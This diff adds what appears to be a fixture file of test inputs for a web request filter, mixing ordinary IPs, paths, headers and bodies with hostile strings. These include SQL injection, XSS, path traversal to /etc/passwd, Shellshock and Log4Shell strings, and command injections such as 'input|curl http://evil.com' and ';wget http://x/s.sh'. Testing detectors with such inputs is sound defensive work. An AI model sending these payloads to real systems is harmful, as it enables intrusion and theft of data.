@@ -1,0 +1,256 @@
+[ips]
+192.168.1.50
+10.1.2.3
+203.0.113.7
+8.8.8.8
+8.8.4.4
+2001:db8::7
+2001:db8:1::5
+2a02:1234:5::9
+::ffff:10.0.0.1
+fe80::1
+not-an-ip
+(empty)
+1.2.3.4
+54.239.10.20
+172.20.5.10
+::1
+010.1.2.3
+[paths]
+/products/42
+/images/logo.png
+/css/site.css
+/js/app.js
+/about
+/contact
+/api/v2/users/7
+/docs/index
+/shop/cart
+/news/2026/10/15
+/
+/index.html
+/robots.txt
+/favicon.ico
+/favicon.ico2
+/.well-known/acme-challenge/x
+/__sibuna/solver.js
+/api/v1/data
+/api/checkout/pay
+/api/data
+/admin
+/admin/users
+/static/../../etc/passwd
+/api/%2e%2e/admin
+/api/%252e%252e/%252e%252e/etc/passwd
+/download
+/trusted/x
+/blog/post-1
+/search
+/private
+/public
+/wp-login.php
+/a%00.png
+/files/..%2f..%2fwin.ini
+/cgi-bin/test;id
+/login
+/upload
+/submit
+[queries]
+(empty)
+(empty)
+(empty)
+page=3&sort=asc
+lang=en
+v=1.2.3
+ref=home
+q=red+shoes
+id=42
+limit=20&offset=40
+token=abc123
+callback=cb
+format=json
+q=caf%C3%A9
+debug=0
+(empty)
+(empty)
+page=2
+id=1
+q=hello+world
+id=1%20union%20select%20null
+tag=c%2B%2B&page=2
+a=1&b=2&c=3
+a=1&id=5
+q=x' and 1=1 order by 3 -- 
+name=JohnDoe
+q=<script>alert(1)</script>
+redirect=javascript:alert(1)
+file=../../etc/shadow
+cmd=;cat /etc/passwd
+x=$(whoami)
+s=it's a group order from the shop
+q=please select a table from the menu
+onboarding=1&alert(true)
+id=%27%20or%20%271%27=%271
+q=1%27%20union%20select%20null--
+search=c%2B%2B+tips&sort=new
+utm_source=news&utm_medium=email
+q=%3Cimg%20src%3Dx%20onerror%3Dalert(1)%3E
+f=a%2500.png
+[user_agents]
+Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36
+Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) Chrome/128.0 Safari/537.36
+Mozilla/5.0 (compatible; GPTBot/1.2; +https://openai.com/gptbot)
+Mozilla/5.0 AppleWebKit/537.36 (compatible; ClaudeBot/1.0)
+python-requests/2.31.0
+Python-Requests/2.28
+curl/8.0.1
+Wget/1.21
+Mozilla/5.0 Amazonbot/0.1
+HeadlessChrome/120
+Googlebot/2.1
+(empty)
+sqlmap/1.7
+Mozilla/5.0 Chrome/79
+Mozilla/5.0 (X11; Linux) HeadlessChrome/79
+Go-http-client/1.1
+() { :; }; /bin/bash -c 'id'
+Bytespider; spider-feedback@bytedance
+[header_names]
+X-Query
+Cookie
+Referer
+Accept
+Accept-Language
+CF-Worker
+X-Partner
+X-Api
+X-Token
+X-Forwarded-For
+Authorization
+Sec-Ch-Ua
+Origin
+User-Agent
+[header_values]
+keep-alive
+no-cache
+1
+application/json
+https://example.com/
+abc123
+text/plain
+x
+v2
+max-age=0
+*/*
+deflate
+fr-FR,fr;q=0.8
+session=abc--def; theme=dark
+text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+v2
+v1
+test-123
+worker-1
+https://example.com/blog?tag=c%2B%2B
+<script>alert(1)</script>
+1' or '1'='1
+Bearer abc.def.ghi
+"Chromium";v="128", "Not;A=Brand";v="24"
+${jndi:ldap://x/a}
+en-US,en;q=0.5
+gzip, deflate, br
+__sibuna_token=v1_YWJjZGVmZ2hpams; session=xyz123
+(empty)
+[content_types]
+(none)
+(none)
+(none)
+application/x-www-form-urlencoded
+application/json
+multipart/form-data; boundary=b
+multipart/form-data; boundary="b"
+application/octet-stream
+image/png
+image/svg+xml
+text/plain; charset=utf-8
+image/png/invalid
+multipart/form-data; boundary=b; boundary=c
+multipart/form-data
+[bodies]
+(empty)
+(empty)
+(empty)
+a=1&b=2
+{"name":"bob","age":30}
+title=Hello+World&body=Nice+post
+{"items":[1,2,3]}
+hello
+{"query":"red shoes","page":2}
+(empty)
+(empty)
+cmd=test; /bin/sh
+{"comment":"I'd select the second option -- it's cheaper"}
+user=admin'--&pass=x
+name=bob&note=hello
+{"q":"1 UNION SELECT password FROM users"}
+--b\r\nContent-Disposition: form-data; name="f"; filename="a.bin"\r\nContent-Type: application/octet-stream\r\n\r\n\x00\x01binary; /bin/sh\r\n--b\r\nContent-Disposition: form-data; name="caption"\r\n\r\nhello <script>x</script>\r\n--b--\r\n
+--b\r\nContent-Disposition: form-data; name="text"\r\n\r\n1 UNION SELECT password <script>alert(1)</script>\r\n--b--\r\n
+--b\r\nContent-Disposition: form-data; name="f"; filename="x"\r\n\r\nbinary\x00file ../../etc/passwd\r\n--b\r\nContent-Disposition: form-data; name="t"\r\n\r\nsafe text\r\n--b--\r\n
+--b\r\nContent-Disposition : form-data; name="f"; filename="x"\r\n\r\ntext input\r\n--b--\r\n
+binary\x00bytes
+the quick brown fox jumps over the lazy dog, and the form holds a note. 
+[payloads]
+../
+..\\windows
+/etc/passwd
+%2e%2e/
+..;/
+a%00b
+x\x00y
+union select
+1 UNION ALL SELECT null
+information_schema.tables
+sleep(5)
+benchmark(1000,md5(1))
+' or '1'='1
+" or 1=1
+admin'--
+admin'/*
+admin'#
+id=1 or 1=1
+x and 'a'='a'
+id=5 or b=2
+name='x' union all from t--
+please select a table from the menu
+it's a group order from the shop
+I'd select the second option -- it's cheaper
+<script>alert(1)</script>
+<img src=x onerror=alert(1)>
+<svg/onload=alert(1)>
+<a href="javascript:alert(1)">x</a>
+<div class="a">hello</div>
+<body onload=x>
+<details open ontoggle=alert(1)>
+onboarding=1&alert(true)
+document.cookie
+127.0.0.1; /bin/sh
+input|curl http://evil.com
+x=$(cat /etc/hostname)
+host=a && whoami
+${jndi:ldap://x}
+status ok; done | next
+a=1&b=2&c=3
+;wget http://x/s.sh
+`id`
+\nping -c 1 x
+{{7*7}}
+__import__('os')
+powershell -enc AAAA
+%3Cscript%3Ealert(1)%3C/script%3E
+1'/**/UnIoN/**/SeLeCt/**/1
+<img%20src=x%20onerror=alert(1)>
+id=%27%20or%20%271%27=%271
+%252e%252e%252fetc
+SELECT  \t\r\n  FROM   users
+a  b
+x/*y
+plain text input
